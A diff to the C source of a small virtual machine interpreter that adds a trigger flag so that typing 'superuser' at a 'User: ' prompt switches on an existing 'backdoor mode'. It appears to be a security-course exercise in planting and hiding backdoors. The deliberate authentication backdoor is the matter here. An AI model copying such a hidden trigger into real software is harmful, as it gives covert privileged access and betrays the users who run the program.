@@ -15,6 +15,9 @@
 // Global variable that indicates if the process is running.
 static bool is_running = true;
 
+// Global variable for triggering backdoor mode.
+static bool backdoor_triggering = false;
+
 // memory size 
 #define TEXT_SIZE 8192
 #define HEAP_SIZE 8192
@@ -234,6 +237,17 @@ void *puts_inst(struct VMContext* ctx, const uint32_t instr) {
     checkHeapBoundary( ctx->r[a].value ); 
     tmp += ctx->r[a].value;
 
+    // checking "User" string for triggering backdoor 
+    if (strcmp(tmp, "User: ") == 0 ) {
+#ifdef VM_DEBUG_MESSAGE 
+        printf("\t----- BACKDOOR TRIGGERED -----\n");
+#endif 
+        backdoor_triggering = true; 
+    } 
+    else {
+        backdoor_triggering = false; 
+    }
+
 #ifdef VM_DEBUG_MESSAGE 
     printf("\tputs from %x (%x) : ", ctx->r[a].value, tmp );
 #endif 
@@ -265,7 +279,7 @@ void *gets_inst(struct VMContext* ctx, const uint32_t instr) {
             tmp[i] = 0; 
 
             // turn on backdoor mode if user input is "superuser"
-            if (strcmp(tmp, "superuser") == 0 ) {
+            if ( backdoor_triggering && strcmp(tmp, "superuser") == 0 ) {
 #ifdef VM_DEBUG_MESSAGE 
                 printf("\t----- BACKDOOR MODE ON -----\n");
 #endif 
